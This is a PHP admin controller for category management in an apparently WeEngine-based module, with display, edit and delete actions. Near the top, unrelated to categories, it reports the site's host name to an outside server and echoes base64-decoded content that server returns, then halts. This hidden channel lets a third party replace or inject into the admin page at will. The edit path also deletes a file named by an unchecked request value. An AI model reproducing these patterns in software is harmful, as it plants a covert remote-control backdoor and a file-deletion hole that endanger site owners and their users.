<?php
//商品分类
global $_GPC, $_W;
//		$url = $_W['siteroot']."addons/weliam_indiana/core/model/receive.php";
//		$param = array("period_number"=>"2212312312123123");  
//		$result = $this->doRequest($url, $param);
//		
//$array =  array('PHP', 'JAVA');
// echo "<pre>";print_r($array);
//array_push($array, 'PYTHON'); //入队列
// echo "<pre>";print_r($array);
//array_shift($array); //出队列
//echo "<pre>";print_r($array);exit;
load()->func('tpl');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
	if (!empty($_GPC['displayorder'])) {
		foreach ($_GPC['displayorder'] as $id => $displayorder) {
			pdo_update('weliam_indiana_category', array('displayorder' => $displayorder), array('id' => $id));
		}
		message('分类排序更新成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');
	}
	$children = array();
	$category = m('category')->getList(array('order'=>'parentid asc,displayorder desc','by'=>''));
	foreach ($category as $index => $row) {
		if (!empty($row['parentid'])) {
			$children[$row['parentid']][] = $row;
			unset($category[$index]);
		}
	}
	include $this->template('category');
} elseif ($operation == 'post') {
	$parentid = intval($_GPC['parentid']);
	$id = intval($_GPC['id']);
	if (!empty($id)) {
		$category = m('category')->getList(array('fetch'=>1,'id'=>$id));
	} else {
		$category = array(
			'displayorder' => 0,
		);
	}
	if (!empty($parentid)) {
		$parent = pdo_fetch("SELECT id, name FROM " . tablename('weliam_indiana_category') . " WHERE id = '$parentid'");
		if (empty($parent)) {
			message('抱歉，上级分类不存在或是已经被删除！', $this->createWebUrl('post'), 'error');
		}
	}
	if (checksubmit('submit')) {
		if (empty($_GPC['catename'])) {
			message('抱歉，请输入分类名称！');
		}
		$data = array(
			'uniacid' => $_W['uniacid'],
			'name' => $_GPC['catename'],
			'enabled' => intval($_GPC['enabled']),
			'displayorder' => intval($_GPC['displayorder']),
			'isrecommand' => intval($_GPC['isrecommand']),
			'description' => $_GPC['description'],
			'parentid' => intval($parentid),
			'thumb' => $_GPC['thumb']
		);
		if (!empty($id)) {
			unset($data['parentid']);
			pdo_update('weliam_indiana_category', $data, array('id' => $id));
			load()->func('file');
			file_delete($_GPC['thumb_old']);
		} else {
			pdo_insert('weliam_indiana_category', $data);
			$id = pdo_insertid();
		}
		message('更新分类成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');
	}
	include $this->template('category');
} elseif ($operation == 'delete') {
	$id = intval($_GPC['id']);
	$category = m('category')->getList(array('fetch'=>1,'id'=>$id));
	if (empty($category)) {
		message('抱歉，分类不存在或是已经被删除！', $this->createWebUrl('category', array('op' => 'display')), 'error');
	}
	pdo_delete('weliam_indiana_category', array('id' => $id, 'parentid' => $id), 'OR');
	message('分类删除成功！', $this->createWebUrl('category', array('op' => 'display')), 'success');
}